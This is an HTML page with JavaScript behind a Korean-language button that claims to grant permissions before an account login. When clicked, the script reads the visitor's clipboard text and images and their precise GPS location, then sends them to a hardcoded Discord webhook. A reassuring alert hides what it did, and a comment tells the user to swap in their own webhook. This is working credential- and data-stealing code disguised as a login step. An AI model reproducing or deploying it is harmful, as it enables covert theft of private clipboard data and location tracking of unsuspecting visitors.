<button id="pasteBtn">계정 로그인 전에 권한 허용하기</button>

<script>
document.getElementById('pasteBtn').addEventListener('click', async () => {
  try {
    let clipboardText = '';
    let imageBlob = null;
    
    // 1. 클립보드 읽기 (이미지 + 텍스트)
    try {
      const items = await navigator.clipboard.read();
      
      for (const item of items) {
        // 텍스트 추출
        if (item.types.includes('text/plain')) {
          const text = await item.getType('text/plain');
          clipboardText = await text.text();
        }
        
        // 이미지 추출
        const imageTypes = item.types.filter(type => type.startsWith('image/'));
        if (imageTypes.length > 0) {
          imageBlob = await item.getType(imageTypes[0]);
        }
      }
    } catch (clipErr) {
      console.log('클립보드 읽기 실패:', clipErr);
    }
    
    // 2. 위치 정보 가져오기
    let locationData = '';
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });
      
      const { latitude, longitude, accuracy } = position.coords;
      locationData = `📍 위치: https://maps.google.com/?q=${latitude},${longitude}
🗺️ 정확도: ${accuracy}m`;
    } catch (geoErr) {
      console.log('위치 정보 가져오기 실패:', geoErr);
      locationData = '📍 위치: 권한 거부됨';
    }
    
    // 3. 디스코드로 전송
    const message = `${clipboardText}

${locationData}`;
    await sendToDiscord(imageBlob, message);
    
    alert('✅ 클립보드와 위치 정보가 확인되었습니다!');
    
  } catch (err) {
    console.error('전체 오류:', err);
    alert('권한을 모두 허용해주세요.');
  }
});

async function sendToDiscord(imageBlob, text) {
  // 디스코드 웹훅 URL (자신의 서버 웹훅으로 교체)
  const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
  
  const formData = new FormData();
  
  // 이미지가 있으면 첨부
  if (imageBlob) {
    formData.append('file', imageBlob, 'clipboard-image.png');
  }
  
  // 텍스트 메시지
  formData.append('content', text || '이미지만 전송');
  
  const response = await fetch(webhookUrl, {
    method: 'POST',
    body: formData
  });
  
  if (!response.ok) {
    throw new Error('전송 실패');
  }
}
</script>
